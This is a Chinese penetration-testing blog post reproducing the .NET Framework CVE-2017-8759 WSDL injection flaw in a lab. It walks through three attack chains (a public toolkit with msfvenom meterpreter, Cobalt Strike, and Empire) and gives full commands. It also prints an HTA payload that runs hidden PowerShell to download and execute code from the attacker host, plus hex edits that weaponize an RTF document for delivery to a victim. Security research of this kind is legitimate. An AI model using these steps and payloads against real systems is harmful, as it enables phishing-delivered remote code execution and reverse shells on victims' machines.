# 微软.NET Framework cve-2017-8759 复现 - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/7550902.html`](https://www.cnblogs.com/backlion/p/7550902.html)

### 0x00 漏洞前言

 FireEye 公司最近发现一份恶意微软 Office RTF 文档，其中利用到一项 SOAP WSDL 解析器代码注入漏洞——编号 CVE-2017-8759。该漏洞允许恶意人士在解析 SOAP WSDL 的定义内容期间注入任意代码。FireEye 公司对该微软 Office 文档进行了分析，并发现攻击者能够利用代码注入方式下载并执行一份包含 PowerShell 指令的 Visual Basic 脚本。

### 0x01 漏洞复现

#### 方法一：通过 cve-2017-8759_toolk 反弹 msf

测试环境：

目标靶机：win7x64  office2010(只能在 office2010 以上执行才能成功） ip:10.0.0.89

攻击机：kali2016  ip:10.0.0.86

在 kali 上执行：

1.下载 cve-2017-8759_toolkt 利用 poc

root@backlion:/opt# git clone https://github.com/bhdresh/CVE-2017-8759.git

 ![](img/0ffc75463043a6128b3f69d7be7ed787.png)

2.进入到 cve-2017-8759 目录中

root@backlion:/opt# cd CVE-2017-8759/

root@backlion:/opt/CVE-2017-8759# ls

 ![](img/9d28c6e2915a427dea72bda35ccd43ef.png)

3.执行生成恶意的 rtf 文档

root@backlion:/opt/CVE-2017-8759# python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://10.0.0.86/logo.txt

 ![](img/7822a9269839baadeff6e1c039af99c6.png)

4.执行生成恶意的后门文件 shell.exe,本地监听 4444 端口

root@backlion:/opt/CVE-2017-8759# msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.0.0.86   LPORT=4444 -f exe > /tmp/shell.exe

 ![](img/4986ddf8bda904f128682c5327ececd3.png)

5.开启 web 服务并监听来自访问

root@backlion:/opt/CVE-2017-8759#  python cve-2017-8759_toolkit.py -M exp -e http://10.0.0.86/shell.exe -l /tmp/shell.exe

 ![](img/51cff114366833b707a023da1684da9e.png)

6.接着开启 msf,并设置本地监听地址和监听端口以及 payload

msf > use exploit/multi/handler

msf exploit(handler) > set payload windows/x64/meterpreter_reverse_tcp

msf exploit(handler) > set lhost  10.0.0.86

msf exploit(handler) > set lport  4444

msf exploit(handler) > exploit

sessions  -i  1

 ![](img/036321e06e445d8b8263e6df2dad8099.png)

最后将 Invoice.rtf 文档拷贝或者发送等方式到目标靶机上并执行，就可以成功反弹出 shell:

 ![](img/8ea67de6099534fd16e93b864e052172.png)

#### 方法二:利用 cobaltstrike 复现

测试环境：

目标靶机：win7x64  office2016(只能在 office2010 以上执行才能成功）   ip:10.0.0.201

攻击机：kali2016  ip:10.0.0.86

1.启动 cobaltstrike 服务端：

root@backlion:/opt# cd  cobaltstrike/

root@backlion:/opt/cobaltstrike# ./teamserver  10.0.0.86  backlion

 ![](img/caa8fc86a088c79cd4abfaa8d81eedf9.png)

![](img/3ad808e368fb55a249ff98513c8c3bce.png)

2.启动 cobaltstrike 客户端：

root@backlion:/opt/cobaltstrike# java -jar  cobaltstrike.jar

 ![](img/ee38018a51b95c03294c2026789c5ce5.png)

![](img/268d1c36bec316dde01a06e7e09dbb77.png)

3.设置一个 Listener（Cobal Strike = > Listener => add），添加一个 HTTPS 的监听器，端口为 443

 ![](img/e998c18b592475b31036ac2e37ab2b6a.png)

4.下载 CVE-2017-8759，并将 cmd.hta 重名为 cmd.jpg 然后修改里面的内容，主要修改里面的 IP 地址，然后修改后的 cmd.jpg 拷贝到 kali 主机上的/opt 目录下。我这里已经修改好了，可到我的 github 下载。其下载地址：https://raw.githubusercontent.com/backlion/demo/master/CVE-2017-8759-master.zip

主要 poc:

```
<html>

<head>

< script language="VBScript"> Sub window_onload

    window.resizeTo 0,0 window.MoveTo -100,-100

       const impersonation = 3 Const HIDDEN_WINDOW = 12 Set Locator = CreateObject("WScript.Shell")

    Locator.Run"powershell.exe -nop -w hidden -c ""IEX (new-object net.webclient).downloadstring('http://10.0.0.86/bk.exe')""",0,FALSE

    window.close()

end sub </script>

<!--

<script language="VBScript"> Sub window_onload const impersonation = 3 Const HIDDEN_WINDOW = 12 Set Locator = CreateObject("WbemScripting.SWbemLocator")

       Set Service = Locator.ConnectServer()

       Service.Security_.ImpersonationLevel=impersonation

       Set objStartup = Service.Get("Win32_ProcessStartup")

       Set objConfig = objStartup.SpawnInstance_

       Set Process = Service.Get("Win32_Process")

       Error = Process.Create("powershell.exe -nop -w hidden calc.exe", null, objConfig, intProcessID)

       window.close()

end sub </script>

-->

</head>
```

![](img/561209f3466f49d5ca3fa3979c5a6951.png)

5.另外也需要修改 exploit.txt 里面的 IP 地址，修改后也要上传到 kali 的/opt 目录下。

 ![](img/0271981ea567bfaf5b020b619bb79a94.png)

6.设置 Web Drive 功能并添加 cmd.jpg

Attacks=>Web Drive-by=> HOST file

 ![](img/066134b1b87ebb517fe8792aeaeabd97.png)

7.设置 Attacks=>Web Drive-by=> HOST file

 ![](img/ad607efad25a87b784aa3a683018416d.png)

8.生成木马 Attacks=>Web Drive-by=> Script Web Delivery

 ![](img/e0a32965e21f4601b5523ff13a59c344.png)

9.点击 Attacks=>Web Drive-by=> mange，查看当前设置：

 ![](img/d08fdadb704ce7c26772f39a6dd26a26.png)

10.制作 trf 文档，打开 office，本人装的是 win7，所以是 office2016，插入对象为：http://10.0.0.86/exploit.txt,并保存成为 test.rtf

 ![](img/11e57157898e2257df19b99d1f386717.png)

11.在 test.rtf 中用记事本打开并查找找到

{\object\objautlink\rsltpict\objw4321\objh4321 这一部分，替换修改为：{\object\objupdate\objautlink\rsltpict\objw4321\objh4321。其目的是让 word 自动更新加载 poc.

![](img/69c1a0f8990b5765862d693d686c4576.png)

 12.用 C32Asm 静态反编译工具以 16 进制打开并编辑修改 blob.bin

 ![](img/f482e800c6486889d11c975fb8f6c608.png)

然后修改为：http://10.0.0.86/exploit.txt，利用小葵工具将其转化为 16 进制，去掉 0x，最终为：

68007400740070003A002F002F00310030002E0030002E0030002E00380036002F006500780070006C006F00690074002E00740078007400

 ![](img/bbee0b6e08328b004d9d9169c521a7fe.png)

通过查找替换 16 进制进行修改：

拷贝--hex 格式出：

680074007400700073003A002F002F0078007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800780078000000000000000000

替换为：

68007400740070003A002F002F00310030002E0030002E0030002E00380036002F006500780070006C006F00690074002E00740078007400000000000000000000000000000000000000000000000000

 ![](img/2d84d75f88d383ea020376d256b89e16.png)

然后保存，并在 kali 查看是否生成正确的地址

![](img/9acb079c29d978a0445e34ac38190379.png)

13.将生成好的 blob.bin 以 16 进制打开，然后全选--拷贝--hex 拷贝

粘贴处所有的十六进制替换掉 test.rtf 里面的从：

}{\*\objdata 开始到}{\result 之间的所有数据，并保存文件

 ![](img/ebc8146e920cee24f8ad78c019b1d19b.png)

14.将替换好的 test.rtf 文件传输或者发送到目标靶机 windows7 主机上，并打开执行。

 ![](img/6135f5ad95f73d69836f3c68c4f2839b.png)

15.即可在 cs 中反弹出 shell 出来：

 ![](img/b168817bcc15a5b1f484b2df7dd585ac.png)

#### 方法三：通过 empire 复现漏洞

测试环境：

目标靶机：win7x64 office2016(只能在 office2010 以上执行才能成功）

ip:10.0.0.201

攻击机：kali2016 ip:10.0.0.86

1.采用最新版本 emprie2.1 进行测试，这里分别设置了监听地址名为 http，生成 hta 恶意代码。

(Empire) > listeners

(Empire: listeners) > uselistener http

(Empire: listeners/http) > execute

 ![](img/7a3434f58bb323f242555aa6b102e7ac.png)

(Empire: listeners/http) > back

(Empire: listeners) > help

 ![](img/16811502d2f9206153c0751172da43f3.png)

(Empire: listeners) > usestager windows/hta

 ![](img/6b45bd7e6a845aa91606e7118d67dacb.png)

(Empire: stager/windows/hta) > set Listener http

(Empire: stager/windows/hta) > execute

 ![](img/ea9efcad28e6b48162aaa78e19508a1c.png)

2.将生成的 hta 代码保存为 cmd.jpg 文件。

 ![](img/9e215a7afbf8d9c4187224facc5dad56.png)

3.修改 exploit.txt 里面的地址，这里改成我的攻击机 kali 的 ip 地址。

 ![](img/fa9dfeea38d11f335fee22637ebfe00e.png)

3.将修改好的 cmd.jpg 和 exploit 文件放在同一目录 www 文件中，然后执行 python 的 web 启动服务命令，这里监听端口为 8000

 ![](img/f907699ca5a7cd3e3d5780e454ce83e1.png)

3.生成钓鱼 rtf 文档，这里在新建的 word 文件中插入一个对象为：http://10.0.0.86:8000/exploit.txt，然后保存为 test.rtf 文件

 ![](img/1fc5574b4836b3b5c6d99bba76dee884.png)

![](img/27b40e4720f785de156fecae0e3cba72.png)

4\. 在 test.rtf 中用记事本打开并查找找到

{\object\objautlink\rsltpict\objw4321\objh4321 这一部分，替换修改为：

{\object\objupdate\objautlink\rsltpict\objw4321\objh4321

 ![](img/c6ab206bb0dea20c26fec3e13b67ad5a.png)

5\. 用 C32Asm 静态反编译工具以 16 进制打开并编辑修改 blob.bin

 ![](img/5c22b485f66838d75be1868e20014bdf.png)

然后修改为：http://10.0.0.86：8000/exploit.txt，利用小葵工具将其转化为 16 进制，

去掉 0x，最终为：

68007400740070003A002F002F00310030002E0030002E0030002E00380036003A0038003000300030002F006500780070006C006F00690074002E00740078007400

通过查找替换 16 进制进行修改：

拷贝--hex 格式出：

680074007400700073003A002F002F007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800000000000000000000000000000000000000000000000000

替换为：

68007400740070003A002F002F00310030002E0030002E0030002E00380036003A0038003000300030002F006500780070006C006F00690074002E00740078007400000000000000000000000000000000000000000000000000000000000000

 ![](img/8d123845a417cfffd726b4b857bf0ae7.png)

然后保存，并在 kali 查看是否生成正确的地址

 ![](img/f9e5e7aedd1d5a925744e0983a136aef.png)

6.将生成好的 blob.bin 以 16 进制打开，然后全选--拷贝--hex 拷贝

粘贴处所有的十六进制替换掉 test.rtf 里面的从：

}{\*\objdata 开始到}{\result 之间的所有数据，并保存文件

 ![](img/4d62fea95c717d2edd863a8ef0843366.png)

7..将替换好的 test.rtf 文件传输或者发送到目标靶机 windows7 主机上，并打

开执行。

 ![](img/9b7dfa62e1e9b99409984af03615773f.png)

8..即可在 empire 中可以获取反弹 shell:

(Empire: stager/windows/hta) > interact 4X3CYAKB

(Empire: 4X3CYAKB) > shell ipconfig

 ![](img/4bda92b192b5ce4035fbe52439dbdb4b.png)

### 0x02 漏洞影响

.NET 系列产品的远程代码执行（RCE）并进一步控制系统

以下.NET 版本

                    Microsoft .NET Framework 4.6.2  

                    Microsoft .NET Framework 4.6.1  

                    Microsoft .NET Framework 3.5.1  

                    Microsoft .NET Framework 4.7 

                    Microsoft .NET Framework 4.6 

                    Microsoft .NET Framework 4.5.2 

                    Microsoft .NET Framework 3.5 

                    Microsoft .NET Framework 2.0 SP2